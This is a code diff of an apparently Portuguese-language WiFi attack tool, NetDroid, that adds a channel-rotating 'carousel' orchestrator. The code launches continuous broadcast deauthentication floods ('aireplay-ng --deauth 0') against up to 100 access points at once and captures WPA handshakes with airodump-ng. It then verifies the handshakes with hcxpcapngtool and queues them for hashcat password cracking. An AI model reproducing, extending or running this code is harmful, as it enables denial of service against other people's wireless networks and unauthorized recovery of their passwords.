@@ -114,7 +114,7 @@ except Exception:
     HAS_REPORTLAB = False
 
 # ═══════════════════════ CONSTANTS ════════════════════════════
-VERSION = "1.5.4"
+VERSION = "1.5.6"
 GITHUB_RAW_URL = "https://raw.githubusercontent.com/yamotoz/NetDroid/main/NetDroid.py"
 GITHUB_VERSION_URL = "https://raw.githubusercontent.com/yamotoz/NetDroid/main/VERSION"
 HAS_NMAP_BIN = bool(shutil.which("nmap"))
@@ -179,7 +179,10 @@ WORDLIST_DIR = Path("WordList")
 HANDSHAKE_DIR = Path("handshakes")
 PASS_DIR = Path("Pass")              # senhas quebradas (append-only)
 IMPORTS_DIR = Path("imports")        # exports de zonas (PDF + TXT)
-DEAUTH_THREAD_LIMIT = 8              # max threads deauth simultâneas (anti-explosion)
+DEAUTH_THREAD_LIMIT = 100            # max threads deauth simultâneas (carrossel + reserva)
+CARROSSEL_SLOT_VERMELHA_S = 15       # tempo por canal quando só há APs em vermelha
+CARROSSEL_SLOT_AZUL_S = 20           # tempo por canal quando há APs em azul (handshake)
+CARROSSEL_AIRODUMP_BOOT_S = 1.5      # pausa entre airodump up e aireplay bursts
 
 # Tabela canal ↔ frequência 802.11 (preenche '?' automaticamente quando
 # uma fonte traz canal mas não freq, ou vice-versa)
@@ -3609,6 +3612,7 @@ class KamikaseEngine:
         self.monitor_falhou = False  # flag global se setup_monitor falhou
         self.monitor_ativo = False   # lazy: só ativa quando primeiro AP entra em vermelha/azul
         self._monitor_lock = threading.Lock()
+        self.carrossel: Optional["CarrosselCanal"] = None  # orquestrador único de canais
         self.hashcat_worker: Optional[HashcatWorker] = None
         self.pmkid: Optional[PMKIDCapture] = None
         self.memoria = MemoriaPersistente() if live else None
@@ -3785,6 +3789,14 @@ class KamikaseEngine:
                 except Exception: pass
             return ok
 
+    def _garantir_carrossel(self) -> None:
+        """Lazy-spawn do CarrosselCanal. Idempotente — chamadas repetidas
+        após start são no-op. Carrossel cuida de todo o ataque/captura
+        nas zonas vermelha+azul, rotacionando entre canais."""
+        if self.carrossel is None:
+            self.carrossel = CarrosselCanal(self)
+        self.carrossel.iniciar()
+
     def remapear_redes(self, scan_profundo: bool = False) -> Dict[str, Any]:
         """Re-escaneia o ambiente WiFi e adiciona SÓ APs novos.
         Não duplica APs já conhecidos. Mescla com memória para
@@ -3935,7 +3947,12 @@ class KamikaseEngine:
             # Se há captura de handshake em andamento (zona azul) OU deauth
             # ativo (zona vermelha), o canal da iface está travado no AP-alvo.
             # Não pular canal — senão airodump/aireplay perdem o canal.
-            if self.capture_stops or self.deauth_procs:
+            # Inclui v1.5.6: carrossel (modelo novo) também trava canal por slot.
+            carrossel_ativo = (self.carrossel is not None and
+                                self.carrossel.thread is not None and
+                                self.carrossel.thread.is_alive() and
+                                self.carrossel.canal_atual is not None)
+            if self.capture_stops or self.deauth_procs or carrossel_ativo:
                 if self.scan_continuo_stop.wait(1.0):
                     break
                 continue
@@ -3991,44 +4008,36 @@ class KamikaseEngine:
             self.deauth_threads.pop(bssid, None)
             self.ui.info(f"Deauth encerrado para {bssid}")
 
-        # ─── inicia deauth se entrou na zona vermelha ───
-        if destino == "vermelha":
-            # Lazy: ativa monitor mode na primeira vez que algum AP entra
-            # em vermelha ou azul.
+        # ─── entrada em vermelha ou azul: ativa monitor + carrossel ────
+        if destino in ("vermelha", "azul"):
             if not self._garantir_monitor_ativo():
-                ap["crack"] = ap.get("crack") or {}
                 ap["monitor_failed"] = True
                 ap["monitor_aviso"] = ("Falha ao ativar monitor mode. Verifique "
                                         "driver da placa WiFi e airmon-ng.")
                 emitir("monitor_failed", bssid=bssid, motivo=ap["monitor_aviso"])
-                self.ui.error(f"⚠ {bssid}: monitor mode falhou — deauth abortado.")
+                self.ui.error(f"⚠ {bssid}: monitor mode falhou.")
             else:
-                stop = threading.Event()
-                self.deauth_stops[bssid] = stop
-                t = threading.Thread(target=self._loop_deauth_zona,
-                                      args=(bssid, stop), daemon=True,
-                                      name=f"deauth-{bssid}")
-                t.start()
-                self.deauth_threads[bssid] = t
-                canal_aviso = ap.get("canal", "?")
-                self.ui.warn(f"⚡ Deauth contínuo iniciado em {bssid} "
-                              f"(canal {canal_aviso}, broadcast --deauth 0)")
-
-        # ─── enfileira hashcat se entrou na zona azul ───
-        if destino == "azul" and self.hashcat_worker:
-            # Lazy monitor também
-            if not self._garantir_monitor_ativo():
-                ap["crack"] = {"status": "monitor_failed",
-                                "erro": "monitor mode falhou", "progresso": 0.0,
-                                "eta": "?"}
-                emitir("ap_update", **ap)
-                self.ui.error(f"⚠ {bssid}: monitor mode falhou — captura abortada.")
-            else:
-                # Atualiza pmkid com a iface monitor recém-ativada
+                # Verifica canal — sem ele o carrossel pula este AP
+                if ap.get("canal") in (None, "", "?"):
+                    self.ui.warn(f"  ⚠ {bssid}: canal desconhecido. "
+                                  "Re-escaneie via NMCLI antes.")
+                # Salva config de wordlists/perfil pro carrossel usar
+                # quando capturar handshake (zona azul)
+                if destino == "azul":
+                    wls = wordlists if wordlists else ([wordlist] if wordlist else [])
+                    if wls:
+                        ap["crack_wordlists"] = wls
+                    ap["crack_perfil"] = perfil
+                    ap["crack"] = {"status": "queued_carrossel",
+                                    "progresso": 0.0, "eta": "?",
+                                    "tentativa": 0}
+                # Atualiza iface no pmkid (caso seja usado em outros caminhos)
                 if self.pmkid:
                     self.pmkid.iface = self.iface_monitor or self.iface_orig
-                wls = wordlists if wordlists else ([wordlist] if wordlist else [])
-                self._iniciar_crack_async(ap, perfil, wls, contextual, stop_on_crack)
+                # Garantir carrossel rodando
+                self._garantir_carrossel()
+                self.ui.warn(f"⚡ {bssid} entrou em {destino} (canal "
+                              f"{ap.get('canal','?')}) — carrossel orquestrando")
 
         # Persiste movimentação na memória
         if self.memoria:
@@ -4221,82 +4230,72 @@ class KamikaseEngine:
                           name=f"capture-{bssid}").start()
 
     def reset_deauth(self, bssid: str):
-        """Reinicia o ataque de deauth para um BSSID específico."""
-        # Para deauth existente se houver
-        if bssid in self.deauth_stops:
-            self.deauth_stops[bssid].set()
-            self.deauth_stops.pop(bssid, None)
-            self.deauth_threads.pop(bssid, None)
-            time.sleep(0.1)  # Pequena pausa para encerramento limpo
-        # Reinicia contador
+        """Zera contador do AP e garante carrossel ativo. No modelo carrossel,
+        não há thread per-AP pra reiniciar — o carrossel já cicla por canais.
+        Botão é mais um 'zerei o histórico, ainda atacando' do que reset real."""
         with self.contador_lock:
             self.contador_por_bssid[bssid] = 0
-        # Recria thread de deauth
-        stop = threading.Event()
-        self.deauth_stops[bssid] = stop
-        t = threading.Thread(target=self._loop_deauth_zona,
-                              args=(bssid, stop), daemon=True,
-                              name=f"deauth-{bssid}-reset")
-        t.start()
-        self.deauth_threads[bssid] = t
-        self.ui.warn(f"↻ Deauth reiniciado para {bssid}")
-        # Atualiza AP
         ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
         if ap:
             ap["pacotes"] = 0
             emitir("ap_update", **ap)
+        self._garantir_carrossel()
+        self.ui.info(f"↻ Contador zerado para {bssid} (carrossel segue ativo)")
 
     def recapturar_handshake(self, bssid: str):
-        """Cancela captura em andamento e refaz do zero. Usado pelo botão
-        '🔄 Recapturar handshake' do dashboard. Idempotente."""
+        """Re-marca AP da zona azul pra captura: limpa handshake_path antigo,
+        cancela job hashcat se houver, e o carrossel re-tenta no próximo slot
+        deste canal. Idempotente."""
         ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
         if not ap:
             self.ui.warn(f"recapturar_handshake: BSSID {bssid} não encontrado")
             return
-        # Cancela captura atual se existir
-        ev = self.capture_stops.get(bssid)
-        if ev:
-            ev.set()
-            self.ui.info(f"  Captura anterior de {bssid} cancelada")
-            time.sleep(0.5)  # tempo pro loop antigo sair limpo
-            self.capture_stops.pop(bssid, None)
-        # Cancela job hashcat se ja foi enfileirado
+        # Cancela job hashcat (se ja foi enfileirado/rodando)
         if self.hashcat_worker:
             try: self.hashcat_worker.cancelar(bssid)
             except Exception: pass
-        # Limpa estado de handshake/crack anterior
+        # Limpa estado de handshake/crack — carrossel volta a incluir este AP
+        # nos slots de captura do canal dele
         ap.pop("handshake_path", None)
         ap.pop("handshake_em", None)
-        ap["crack"] = {"status": "capturing", "progresso": 0.0, "eta": "?",
-                        "tentativa": 0, "estrategia": 0}
+        ap["crack"] = {"status": "queued_carrossel", "progresso": 0.0,
+                        "eta": "?", "tentativa": 0}
         emitir("ap_update", **ap)
-        # Re-dispara pipeline completo. Reusa wordlists já configuradas no AP
-        # (via memória/modal "configurar"). Se nada, lista vazia → modal vai
-        # pedir ao usuário.
-        wls = ap.get("crack_wordlists") or []
-        self._iniciar_crack_async(ap, ap.get("crack_perfil", "low"),
-                                    wls, contextual=True)
-        self.ui.info(f"🔄 Recaptura disparada para {bssid}")
+        # Garantir carrossel ativo (caso o usuário tenha movido tudo pra fora antes)
+        self._garantir_carrossel()
+        self.ui.info(f"🔄 Recaptura programada para {bssid} no próximo slot ch{ap.get('canal','?')}")
 
     def reset_crack(self, bssid: str, recapturar: bool = False):
-        """Reinicia o crack de um AP. Se recapturar=True, recaptura handshake primeiro."""
+        """Reset crack — adaptado pro modelo carrossel. Se recapturar=True,
+        delega pra recapturar_handshake (que limpa handshake_path e o
+        carrossel re-tenta). Senão, só re-enfileira no hashcat com handshake
+        existente."""
         ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
         if not ap:
             return
-        # Cancela job atual se existir
         if self.hashcat_worker:
-            self.hashcat_worker.cancelar(bssid)
-        # Limpa estado anterior
+            try: self.hashcat_worker.cancelar(bssid)
+            except Exception: pass
+        if recapturar:
+            self.recapturar_handshake(bssid)
+            return
+        # Sem recapturar: só re-enfileira hashcat com handshake existente
         ap["crack"] = {"status": "resetting", "progresso": 0.0}
         emitir("ap_update", **ap)
-        if recapturar:
-            # Remove handshake anterior
-            if ap.get("handshake_path"):
-                ap.pop("handshake_path", None)
-                ap.pop("handshake_em", None)
-            self.ui.info(f"↻ Recapturando handshake de {bssid}...")
-            # Reinicia pipeline completo
-            self._iniciar_crack_async(ap, "low", [], contextual=True)
+        if ap.get("handshake_path"):
+            pcap = Path(ap["handshake_path"])
+            wls = ap.get("crack_wordlists") or []
+            wl_paths = []
+            for w in wls:
+                wp = Path(w) if Path(w).is_absolute() else WORDLIST_DIR / w
+                if wp.exists():
+                    wl_paths.append(wp)
+            if wl_paths and self.hashcat_worker:
+                self.hashcat_worker.enfileirar(
+                    bssid=bssid, essid=ap.get("essid", ""),
+                    pcapng=pcap, perfil=ap.get("crack_perfil", "low"),
+                    wordlists=wl_paths, contextual=True)
+                self.ui.info(f"↻ Crack re-enfileirado para {bssid}")
         else:
             self.ui.info(f"↻ Crack reiniciado para {bssid} (usando handshake existente)")
             # Reenfileira com handshake existente se houver
@@ -5270,8 +5269,12 @@ class KamikaseEngine:
         print()  # quebra linha do print live
         self.ui.section("KAMIKASE — encerrando")
         self.stop_event.set()
-        # Mata subprocess
-        for p in self.subprocs:
+        # Para carrossel primeiro (mata aireplays e airodumps em curso)
+        if self.carrossel:
+            try: self.carrossel.parar()
+            except Exception: pass
+        # Mata subprocess (snapshot da lista — threads filhas podem appendar)
+        for p in list(self.subprocs):
             try:
                 p.terminate()
                 try:
@@ -5280,8 +5283,8 @@ class KamikaseEngine:
                     p.kill()
             except Exception:
                 pass
-        # Aguarda threads scapy
-        for t in self.threads:
+        # Aguarda threads scapy (snapshot)
+        for t in list(self.threads):
             t.join(timeout=2)
         # Restaura monitor → managed
         self._restaurar_iface()
@@ -5567,49 +5570,71 @@ class PMKIDCapture:
     def capturar_infinito(self, bssid: str, canal: int = 0,
                           stop_event: Optional[threading.Event] = None,
                           on_tentativa=None) -> Optional[Path]:
-        """Captura de handshake — estratégia única, cirúrgica:
+        """Captura cirúrgica de handshake — v1.5.5
 
-          1. Trava o canal da iface monitor no canal do AP (essencial — sem
-             isso o channel hopper pula fora durante a escuta).
-          2. Sobe airodump-ng filtrado por BSSID escutando em background.
-          3. Loop: dispara burst de 30 deauth via aireplay-ng, espera 8s pro
-             cliente reconectar e o 4-way handshake aparecer no .cap, e
-             checa o .cap por EAPOL (>= 2 frames). Repete até pegar.
-          4. Cancelável via stop_event. Nunca propaga exception.
+        Fluxo robusto:
+          1) Sem canal definido → aborta (avisa pra re-escanear via NMCLI).
+          2) Trava iface no canal do AP via `iw set channel`.
+          3) Sobe airodump-ng escutando o BSSID. Reinicia se morrer.
+          4) Loop: re-trava canal (vermelha em outro canal pode ter roubado),
+             dispara burst de 30 `--deauth` (não 0/infinito — burst finito é
+             mais limpo aqui), espera 10s pro 4-way handshake aparecer, e
+             checa via **hcxpcapngtool** (mesma ferramenta da conversão —
+             zero falso positivo: se ela extrai, hashcat crackeia).
+          5) Cancelável via stop_event. Nunca propaga exception.
         """
         if not (HAS_AIRODUMP and HAS_AIREPLAY):
-            self.ui.error("  ✗ airodump-ng e aireplay-ng são necessários "
-                          "para captura. Instale aircrack-ng suite.")
+            self.ui.error("  ✗ airodump-ng e aireplay-ng são necessários.")
             return None
+        canal_alvo = int(canal) if canal and str(canal).strip() not in ("?", "") else 0
+        if not canal_alvo:
+            self.ui.error(f"  ✗ {bssid}: canal desconhecido. Re-escaneie via NMCLI "
+                          "antes de mover pra zona azul.")
+            try: emitir("handshake_log", bssid=bssid,
+                          msg="canal desconhecido — abortando")
+            except Exception: pass
+            return None
+
         nome = bssid.replace(":", "")
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
         base = HANDSHAKE_DIR / f"hs_{nome}_{ts}"
         cap_file = Path(str(base) + "-01.cap")
 
-        # 1) Trava o canal pra airodump não ficar pulando
-        canal_alvo = int(canal) if canal else 1
-        if HAS_IW:
+        def _trava_canal():
+            if not HAS_IW:
+                return
             try:
-                subprocess.run(["iw", "dev", self.iface, "set", "channel", str(canal_alvo)],
-                               timeout=3, check=False,
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(["iw", "dev", self.iface, "set", "channel",
+                                 str(canal_alvo)],
+                                timeout=3, check=False,
+                                stdout=subprocess.DEVNULL,
+                                stderr=subprocess.DEVNULL)
             except Exception:
                 pass
 
-        # 2) Airodump escutando, filtrado pelo BSSID e canal
-        cmd_dump = ["airodump-ng", "--bssid", bssid,
-                    "--channel", str(canal_alvo),
-                    "-w", str(base), "--output-format", "cap",
-                    self.iface]
+        def _spawn_airodump():
+            cmd = ["airodump-ng", "--bssid", bssid,
+                   "--channel", str(canal_alvo),
+                   "-w", str(base), "--output-format", "cap",
+                   self.iface]
+            return subprocess.Popen(cmd,
+                                     stdout=subprocess.DEVNULL,
+                                     stderr=subprocess.DEVNULL)
+
+        _trava_canal()
         try:
-            p_dump = subprocess.Popen(cmd_dump,
-                                       stdout=subprocess.DEVNULL,
-                                       stderr=subprocess.DEVNULL)
+            p_dump = _spawn_airodump()
         except Exception as e:
             self.ui.error(f"  ✗ airodump-ng não subiu: {e}")
+            try: emitir("handshake_log", bssid=bssid,
+                          msg=f"airodump não subiu: {e}")
+            except Exception: pass
             return None
-        # Pequena pausa pra airodump registrar canal
         time.sleep(2.0)
+        self.ui.info(f"  airodump escutando {bssid} ch{canal_alvo}")
+        try: emitir("handshake_log", bssid=bssid,
+                      msg=f"airodump ch{canal_alvo} OK")
+        except Exception: pass
 
         tentativa = 0
         try:
@@ -5621,28 +5646,66 @@ class PMKIDCapture:
                 if on_tentativa:
                     try: on_tentativa(1, tentativa)
                     except Exception: pass
-                self.ui.info(f"  ↻ {bssid} — burst deauth #{tentativa} (30 pkts) "
-                              f"+ aguardando handshake…")
-                # Burst de 30 deauths broadcast (força todos clientes)
+
+                # Re-trava canal (zona vermelha em canal diferente pode ter
+                # mexido a iface entre tentativas)
+                _trava_canal()
+
+                # Garante airodump vivo
+                if p_dump.poll() is not None:
+                    self.ui.warn(f"  airodump morreu, reiniciando…")
+                    try: emitir("handshake_log", bssid=bssid,
+                                  msg="airodump morreu — restart")
+                    except Exception: pass
+                    try:
+                        p_dump = _spawn_airodump()
+                    except Exception as e:
+                        self.ui.error(f"  ✗ airodump não reiniciou: {e}")
+                        return None
+                    time.sleep(2.0)
+
+                self.ui.info(f"  ↻ {bssid} ch{canal_alvo} — burst #{tentativa} "
+                              f"(30 deauths)")
+                try: emitir("handshake_log", bssid=bssid,
+                              msg=f"burst #{tentativa} ch{canal_alvo}")
+                except Exception: pass
+
+                # Burst finito de 30 deauths — mais limpo que --deauth 0
                 try:
                     subprocess.run(["aireplay-ng", "-0", "30",
+                                     "--ignore-negative-one",
                                      "-a", bssid, self.iface],
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL, timeout=20)
-                except Exception:
-                    pass
-                # Aguarda 8s pro cliente reconectar e EAPOL aparecer no cap
-                # — aborta se stop_event sinaliza
-                for _ in range(8):
+                except Exception as _e:
+                    self.ui.warn(f"  aireplay falhou no burst #{tentativa}: {_e}")
+
+                # Espera 10s pro 4-way handshake completar e ser gravado
+                for _ in range(10):
                     if stop_event is not None and stop_event.wait(1.0):
                         return None
                     elif stop_event is None:
                         time.sleep(1.0)
-                # Checa se handshake já apareceu
-                if cap_file.exists() and self._cap_tem_handshake(cap_file, bssid):
-                    self.ui.success(f"  ✓ Handshake capturado em {tentativa} "
-                                    f"bursts: {cap_file.name}")
-                    return cap_file
+
+                # Detecção rigorosa via hcxpcapngtool (mesma do pipeline
+                # de conversão). Se ela conseguir extrair → hashcat crackeia.
+                if cap_file.exists():
+                    tamanho = cap_file.stat().st_size
+                    tem = self._cap_tem_handshake(cap_file, bssid)
+                    self.ui.info(f"  cap={tamanho}B handshake_real={tem}")
+                    try: emitir("handshake_log", bssid=bssid,
+                                  msg=f"cap {tamanho}B handshake={tem}")
+                    except Exception: pass
+                    if tem:
+                        self.ui.success(f"  ✓ Handshake REAL capturado em "
+                                          f"{tentativa} bursts: {cap_file.name}")
+                        return cap_file
+                else:
+                    self.ui.warn(f"  cap_file ainda inexistente: {cap_file}")
+                    try: emitir("handshake_log", bssid=bssid,
+                                  msg="cap_file inexistente — airodump falhando?")
+                    except Exception: pass
+
                 if not HANDSHAKE_RETRY_FOREVER and tentativa >= 30:
                     self.ui.warn(f"  Limite de {tentativa} tentativas atingido")
                     return None
@@ -5656,49 +5719,338 @@ class PMKIDCapture:
 
     @staticmethod
     def _cap_tem_handshake(cap_file: Path, bssid: str) -> bool:
-        """Detecta presença de handshake no .cap. Tenta aircrack-ng (mais
-        confiável), depois scapy contando EAPOL. Idempotente — pode chamar
-        várias vezes durante a captura."""
+        """Detecção rigorosa: usa **hcxpcapngtool** (mesma ferramenta da
+        conversão pra hashcat). Se ela conseguir extrair um .22000 não-vazio,
+        hashcat vai crackear. Sem ambiguidade. Fallback aircrack-ng se hcx
+        ausente. EAPOL>=2 via scapy NÃO é mais usado — gerava falso positivo."""
         try:
             tamanho = cap_file.stat().st_size
         except Exception:
             return False
         if tamanho < 1024:
             return False
-        # Caminho rápido: aircrack-ng lista handshakes encontrados
-        if HAS_AIRCRACK:
+        # Caminho ideal: hcxpcapngtool — match perfeito com etapa de conversão
+        if HAS_HCXPCAPNGTOOL:
+            tool = shutil.which("hcxpcapngtool") or shutil.which("hcxpcaptool")
+            test_22000 = cap_file.with_suffix(".test.22000")
             try:
-                r = subprocess.run(["aircrack-ng", "-a2", "-w", "/dev/null",
-                                     "-b", bssid, str(cap_file)],
-                                    capture_output=True, text=True,
-                                    timeout=8)
-                saida = (r.stdout or "") + (r.stderr or "")
-                # aircrack imprime "X handshake" quando encontra
-                m = re.search(r"(\d+)\s+handshake", saida, re.IGNORECASE)
-                if m and int(m.group(1)) >= 1:
+                subprocess.run([tool, "-o", str(test_22000), str(cap_file)],
+                                capture_output=True, text=True, timeout=10)
+                if test_22000.exists() and test_22000.stat().st_size > 0:
                     return True
             except Exception:
                 pass
-        # Fallback scapy: conta frames EAPOL associados ao BSSID
-        if HAS_SCAPY:
+            finally:
+                if test_22000.exists():
+                    try: test_22000.unlink()
+                    except Exception: pass
+            # hcxpcapngtool rodou mas não extraiu → SEM handshake
+            return False
+        # Fallback aircrack-ng (sem -a2/-w pra evitar erro de wordlist vazia)
+        if HAS_AIRCRACK:
             try:
-                from scapy.all import rdpcap, EAPOL  # type: ignore
-                pkts = rdpcap(str(cap_file))
-                bssid_l = bssid.lower()
-                eapol = 0
-                for p in pkts:
-                    if not p.haslayer(EAPOL):
-                        continue
-                    a1 = (getattr(p, "addr1", "") or "").lower()
-                    a2 = (getattr(p, "addr2", "") or "").lower()
-                    a3 = (getattr(p, "addr3", "") or "").lower()
-                    if bssid_l in (a1, a2, a3):
-                        eapol += 1
-                        if eapol >= 2:
-                            return True
+                r = subprocess.run(["aircrack-ng", str(cap_file)],
+                                    capture_output=True, text=True, timeout=8)
+                saida = (r.stdout or "")
+                # aircrack mostra "WPA (X handshake)" só com handshake completo
+                if re.search(r"WPA.*\(\s*[1-9]\d*\s+handshake", saida,
+                              re.IGNORECASE):
+                    return True
             except Exception:
                 pass
         return False
+
+
+# ══════════════════ CARROSSEL DE CANAL ═════════════════════════
+# Orquestrador single-thread que rotaciona entre os canais com APs ativos
+# em vermelha+azul. Cada slot trava um canal, sobe airodump (se há azul) e
+# aireplay --deauth 0 pra cada AP (vermelha + azul) daquele canal. Após o
+# tempo do slot: mata processos, checa cap pra handshakes, próximo canal.
+# Resolve o conflito fundamental "1 placa = 1 canal" sem precisar de N
+# placas wifi. Single-thread = zero race condition, zero starvation.
+
+class CarrosselCanal:
+    """Orquestrador de ataque por canal — slots rotativos.
+    Funciona com qualquer N de APs (1 a 100+) sem travar."""
+
+    def __init__(self, engine: "KamikaseEngine"):
+        self.eng = engine
+        self.slot_vermelha = CARROSSEL_SLOT_VERMELHA_S
+        self.slot_azul = CARROSSEL_SLOT_AZUL_S
+        self.thread: Optional[threading.Thread] = None
+        self.stop_event = threading.Event()
+        self.lock = threading.Lock()
+        # Estado público (lido pelo /api/carrossel/status e emit tick)
+        self.canal_atual: Optional[int] = None
+        self.canal_inicio: float = 0.0
+        self.canal_slot_s: int = 0
+        self.canais_pendentes: List[int] = []
+
+    def iniciar(self) -> None:
+        with self.lock:
+            if self.thread and self.thread.is_alive():
+                return
+            self.stop_event.clear()
+            self.thread = threading.Thread(target=self._loop, daemon=True,
+                                            name="carrossel-canal")
+            self.thread.start()
+        self.eng.ui.info("🔄 Carrossel de canal iniciado")
+        try: emitir("carrossel_status", ativo=True)
+        except Exception: pass
+
+    def parar(self) -> None:
+        self.stop_event.set()
+        t = self.thread
+        if t:
+            t.join(timeout=3)
+        with self.lock:
+            self.thread = None
+            self.canal_atual = None
+        try: emitir("carrossel_status", ativo=False)
+        except Exception: pass
+
+    def status(self) -> Dict[str, Any]:
+        with self.lock:
+            elapsed = int(time.time() - self.canal_inicio) if self.canal_inicio else 0
+            restante = max(0, self.canal_slot_s - elapsed)
+            return {
+                "ativo": bool(self.thread and self.thread.is_alive()),
+                "canal_atual": self.canal_atual,
+                "slot_s": self.canal_slot_s,
+                "restante_s": restante,
+                "canais_pendentes": list(self.canais_pendentes),
+            }
+
+    # ─── lógica interna ─────────────────────────────────────────
+
+    def _agrupar_por_canal(self) -> Dict[int, Dict[str, List[Dict[str, Any]]]]:
+        """Lê estado vivo das zonas e agrupa APs ativos (vermelha+azul) por
+        canal. APs azul que JÁ têm handshake_path são pulados (carrossel
+        não captura de novo). Idempotente."""
+        eng = self.eng
+        grupos: Dict[int, Dict[str, List[Dict[str, Any]]]] = {}
+        with eng.zonas_lock:
+            for bssid in list(eng.zonas.get("vermelha", [])):
+                ap = next((a for a in eng.alvos if a["bssid"] == bssid), None)
+                if not ap: continue
+                ch = ap.get("canal")
+                if ch in (None, "", "?"): continue
+                try: ch = int(ch)
+                except Exception: continue
+                grupos.setdefault(ch, {"vermelha": [], "azul": []})["vermelha"].append(ap)
+            for bssid in list(eng.zonas.get("azul", [])):
+                ap = next((a for a in eng.alvos if a["bssid"] == bssid), None)
+                if not ap: continue
+                if ap.get("handshake_path"):
+                    continue
+                ch = ap.get("canal")
+                if ch in (None, "", "?"): continue
+                try: ch = int(ch)
+                except Exception: continue
+                grupos.setdefault(ch, {"vermelha": [], "azul": []})["azul"].append(ap)
+        return grupos
+
+    def _loop(self) -> None:
+        eng = self.eng
+        while not self.stop_event.is_set():
+            grupos = self._agrupar_por_canal()
+            if not grupos:
+                with self.lock:
+                    self.canal_atual = None
+                    self.canais_pendentes = []
+                if self.stop_event.wait(2.0):
+                    break
+                continue
+            canais = sorted(grupos.keys())
+            with self.lock:
+                self.canais_pendentes = list(canais)
+            for canal in canais:
+                if self.stop_event.is_set(): break
+                grupo = grupos.get(canal, {"vermelha": [], "azul": []})
+                if not (grupo["vermelha"] or grupo["azul"]):
+                    continue
+                slot_s = self.slot_azul if grupo["azul"] else self.slot_vermelha
+                try:
+                    self._executar_slot(canal, grupo, slot_s)
+                except Exception as e:
+                    eng.ui.warn(f"Slot ch{canal} falhou: {e}")
+
+    def _executar_slot(self, canal: int,
+                         grupo: Dict[str, List[Dict[str, Any]]],
+                         slot_s: int) -> None:
+        eng = self.eng
+        iface = eng.iface_monitor
+        if not iface:
+            return
+
+        # 1. Trava o canal
+        if HAS_IW:
+            try:
+                subprocess.run(["iw", "dev", iface, "set", "channel", str(canal)],
+                                timeout=3, check=False,
+                                stdout=subprocess.DEVNULL,
+                                stderr=subprocess.DEVNULL)
+            except Exception:
+                pass
+
+        with self.lock:
+            self.canal_atual = canal
+            self.canal_inicio = time.time()
+            self.canal_slot_s = slot_s
+
+        try: emitir("carrossel_slot", canal=canal,
+                     vermelha=len(grupo["vermelha"]),
+                     azul=len(grupo["azul"]),
+                     slot_s=slot_s)
+        except Exception: pass
+
+        eng.ui.info(f"🔄 Slot ch{canal} · {len(grupo['vermelha'])} vermelha "
+                    f"+ {len(grupo['azul'])} azul · {slot_s}s")
+
+        # 2. Sobe airodump (só se há AP azul pra capturar handshake)
+        p_dump: Optional[subprocess.Popen] = None
+        cap_file: Optional[Path] = None
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        if grupo["azul"] and HAS_AIRODUMP:
+            cap_base = HANDSHAKE_DIR / f"slot_ch{canal}_{ts}"
+            try:
+                p_dump = subprocess.Popen(
+                    ["airodump-ng", "--channel", str(canal),
+                     "-w", str(cap_base), "--output-format", "cap", iface],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                cap_file = Path(str(cap_base) + "-01.cap")
+                time.sleep(CARROSSEL_AIRODUMP_BOOT_S)
+            except Exception as e:
+                eng.ui.warn(f"  airodump não subiu: {e}")
+                p_dump = None
+                cap_file = None
+
+        # 3. Sobe aireplay --deauth 0 pra cada AP (vermelha + azul) no canal
+        procs: List[Tuple[str, subprocess.Popen, str]] = []
+        if HAS_AIREPLAY:
+            for ap in grupo["vermelha"] + grupo["azul"]:
+                bssid = ap["bssid"]
+                zona_ap = "vermelha" if ap in grupo["vermelha"] else "azul"
+                try:
+                    p = subprocess.Popen(
+                        ["aireplay-ng", "--deauth", "0", "--ignore-negative-one",
+                         "-a", bssid, iface],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    procs.append((bssid, p, zona_ap))
+                except Exception:
+                    pass
+
+        # 4. Aguarda slot, atualiza UI 1×/s
+        inicio = time.time()
+        while time.time() - inicio < slot_s:
+            if self.stop_event.is_set(): break
+            elapsed = time.time() - inicio
+            restante = max(0, slot_s - int(elapsed))
+            # Contador de pacotes (~64/s por aireplay vivo)
+            for bssid, p, _zona in procs:
+                if p.poll() is not None: continue
+                with eng.contador_lock:
+                    eng.contador_global += 64
+                    eng.contador_por_bssid[bssid] = eng.contador_por_bssid.get(bssid, 0) + 64
+            # Emit tick global pro frontend
+            try:
+                with self.lock:
+                    pendentes = list(self.canais_pendentes)
+                emitir("carrossel_tick", canal=canal, restante_s=restante,
+                        slot_s=slot_s, ativo=True, canais_pendentes=pendentes)
+            except Exception: pass
+            # ap_update pra cada AP no slot (atualiza badge "atacando")
+            for ap in grupo["vermelha"] + grupo["azul"]:
+                ap["pacotes"] = eng.contador_por_bssid.get(ap["bssid"], 0)
+                ap["carrossel_canal"] = canal
+                ap["carrossel_slot_restante"] = restante
+                emitir("ap_update", **ap)
+            if self.stop_event.wait(1.0): break
+
+        # 5. Mata todos os aireplays
+        for _bssid, p, _zona in procs:
+            try: p.terminate()
+            except Exception: pass
+        for _bssid, p, _zona in procs:
+            try: p.wait(timeout=1)
+            except Exception:
+                try: p.kill()
+                except Exception: pass
+
+        # 6. Para airodump e checa cap pra cada AP azul desse canal
+        if p_dump:
+            try: p_dump.terminate()
+            except Exception: pass
+            try: p_dump.wait(timeout=2)
+            except Exception:
+                try: p_dump.kill()
+                except Exception: pass
+            if cap_file and cap_file.exists() and cap_file.stat().st_size > 1024:
+                for ap in grupo["azul"]:
+                    bssid = ap["bssid"]
+                    try:
+                        if PMKIDCapture._cap_tem_handshake(cap_file, bssid):
+                            self._registrar_handshake_azul(ap, cap_file)
+                    except Exception as e:
+                        eng.ui.warn(f"  check {bssid} falhou: {e}")
+
+        # Limpa marcador "atacando" dos APs deste slot
+        for ap in grupo["vermelha"] + grupo["azul"]:
+            ap.pop("carrossel_slot_restante", None)
+            emitir("ap_update", **ap)
+
+    def _registrar_handshake_azul(self, ap: Dict[str, Any], cap_file: Path) -> None:
+        """Persiste handshake do AP azul, registra na memória, enfileira no
+        hashcat se há wordlists configuradas. Idempotente."""
+        eng = self.eng
+        bssid = ap["bssid"]
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        nome = bssid.replace(":", "")
+        novo_cap = HANDSHAKE_DIR / f"hs_{nome}_{ts}.cap"
